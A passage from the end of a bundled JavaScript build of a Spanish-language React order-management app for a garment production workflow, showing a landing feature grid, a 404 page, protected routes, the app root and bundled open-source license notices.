            /* @__PURE__ */ jsx71("h2", { className: "text-5xl font-extrabold leading-tight", children: "Sistema de Gesti\xF3n" }),
            /* @__PURE__ */ jsx71("p", { className: "text-xl font-light max-w-md mx-auto leading-relaxed", children: "Controla el flujo completo de pedidos desde Corte hasta Env\xEDos" }),
            /* @__PURE__ */ jsx71("div", { className: "grid grid-cols-2 gap-6 text-sm font-medium", children: [
              {
                title: "7 \xC1reas Integradas",
                desc: "Corte, Bordado, Ensamble, Plancha, Calidad, Env\xEDos y Admin"
              },
              {
                title: "Transferencias Parciales",
                desc: "Control preciso de piezas entre \xE1reas"
              },
              {
                title: "Historial Completo",
                desc: "Seguimiento detallado de cada pedido"
              },
              {
                title: "Notificaciones",
                desc: "Sistema de aceptar/rechazar transferencias"
              }
            ].map(({ title, desc }) => /* @__PURE__ */ jsxs36(
              "div",
              {
                className: "bg-white bg-opacity-20 p-6 rounded-2xl shadow-md",
                children: [
                  /* @__PURE__ */ jsx71("h3", { className: "font-semibold mb-1", children: title }),
                  /* @__PURE__ */ jsx71("p", { children: desc })
                ]
              },
              title
            )) })
          ] })
        ]
      }
    )
  ] });
}

// client/src/pages/not-found.tsx
import { jsx as jsx72, jsxs as jsxs37 } from "react/jsx-runtime";
function NotFound() {
  return /* @__PURE__ */ jsx72("div", { className: "min-h-screen w-full flex items-center justify-center bg-gray-50", children: /* @__PURE__ */ jsx72(Card, { className: "w-full max-w-md mx-4", children: /* @__PURE__ */ jsxs37(CardContent, { className: "pt-6", children: [
    /* @__PURE__ */ jsxs37("div", { className: "flex mb-4 gap-2", children: [
      /* @__PURE__ */ jsx72(CircleAlert, { className: "h-8 w-8 text-red-500" }),
      /* @__PURE__ */ jsx72("h1", { className: "text-2xl font-bold text-gray-900", children: "404 Page Not Found" })
    ] }),
    /* @__PURE__ */ jsx72("p", { className: "mt-4 text-sm text-gray-600", children: "Did you forget to add the page to the router?" })
  ] }) }) });
}

// client/src/App.tsx
import { jsx as jsx73, jsxs as jsxs38 } from "react/jsx-runtime";
function Router2() {
  return /* @__PURE__ */ jsxs38(Switch, { children: [
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/", component: Dashboard }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/orders", component: OrdersPage }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/repositions", component: RepositionsPage }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/history", component: HistoryPage }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/admin", component: AdminPage }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/almacen", component: AlmacenPage }),
    /* @__PURE__ */ jsx73(Route, { path: "/auth", component: AuthPage }),
    /* @__PURE__ */ jsx73(ProtectedRoute, { path: "/agenda", component: AgendaPage }),
    /* @__PURE__ */ jsx73(Route, { component: NotFound })
  ] });
}
function App() {
  return /* @__PURE__ */ jsx73(QueryClientProvider, { client: queryClient, children: /* @__PURE__ */ jsx73(AuthProvider, { children: /* @__PURE__ */ jsxs38(TooltipProvider2, { children: [
    /* @__PURE__ */ jsx73(Toaster, {}),
    /* @__PURE__ */ jsx73(Router2, {})
  ] }) }) });
}
var App_default = App;

// client/src/main.tsx
import { jsx as jsx74 } from "react/jsx-runtime";
createRoot(document.getElementById("root")).render(/* @__PURE__ */ jsx74(App_default, {}));
/*! Bundled license information:

use-sync-external-store/cjs/use-sync-external-store-shim.production.js:
  (**
   * @license React
   * use-sync-external-store-shim.production.js
   *
   * Copyright (c) Meta Platforms, Inc. and affiliates.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE file in the root directory of this source tree.
   *)

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.22.2
  * Released under the MIT License.
  *)

lucide-react/dist/esm/shared/src/utils.js:
lucide-react/dist/esm/defaultAttributes.js:
lucide-react/dist/esm/Icon.js:
lucide-react/dist/esm/createLucideIcon.js:
lucide-react/dist/esm/icons/arrow-right.js:
lucide-react/dist/esm/icons/badge-check.js:
lucide-react/dist/esm/icons/bell.js:
lucide-react/dist/esm/icons/calendar.js:
lucide-react/dist/esm/icons/chart-column.js:
lucide-react/dist/esm/icons/check.js:
lucide-react/dist/esm/icons/chevron-down.js:
lucide-react/dist/esm/icons/chevron-left.js:
lucide-react/dist/esm/icons/chevron-right.js:
lucide-react/dist/esm/icons/chevron-up.js:
lucide-react/dist/esm/icons/circle-alert.js:
lucide-react/dist/esm/icons/circle-check-big.js:
lucide-react/dist/esm/icons/circle-x.js:
lucide-react/dist/esm/icons/circle.js:
lucide-react/dist/esm/icons/clock.js:
lucide-react/dist/esm/icons/download.js:
lucide-react/dist/esm/icons/eye.js:
lucide-react/dist/esm/icons/file-pen.js:
lucide-react/dist/esm/icons/file-text.js:
lucide-react/dist/esm/icons/file.js:
lucide-react/dist/esm/icons/filter.js:
lucide-react/dist/esm/icons/flag.js:
lucide-react/dist/esm/icons/history.js:
lucide-react/dist/esm/icons/hourglass.js:
lucide-react/dist/esm/icons/house.js:
lucide-react/dist/esm/icons/info.js:
lucide-react/dist/esm/icons/layout-grid.js:
lucide-react/dist/esm/icons/loader-circle.js:
lucide-react/dist/esm/icons/log-out.js:
lucide-react/dist/esm/icons/map-pin.js:
lucide-react/dist/esm/icons/package.js:
lucide-react/dist/esm/icons/pause.js:
lucide-react/dist/esm/icons/plus.js:
lucide-react/dist/esm/icons/printer.js:
lucide-react/dist/esm/icons/refresh-cw.js:
lucide-react/dist/esm/icons/rotate-ccw.js:
lucide-react/dist/esm/icons/search.js:
lucide-react/dist/esm/icons/settings.js:
lucide-react/dist/esm/icons/shield.js:
lucide-react/dist/esm/icons/square-pen.js:
lucide-react/dist/esm/icons/trash-2.js:
lucide-react/dist/esm/icons/trending-up.js:
lucide-react/dist/esm/icons/triangle-alert.js:
lucide-react/dist/esm/icons/upload.js:
lucide-react/dist/esm/icons/user.js:
lucide-react/dist/esm/icons/users.js:
lucide-react/dist/esm/icons/x.js:
lucide-react/dist/esm/lucide-react.js:
  (**
   * @license lucide-react v0.453.0 - ISC
   *
   * This source code is licensed under the ISC license.
   * See the LICENSE file in the root directory of this source tree.
   *)
*/
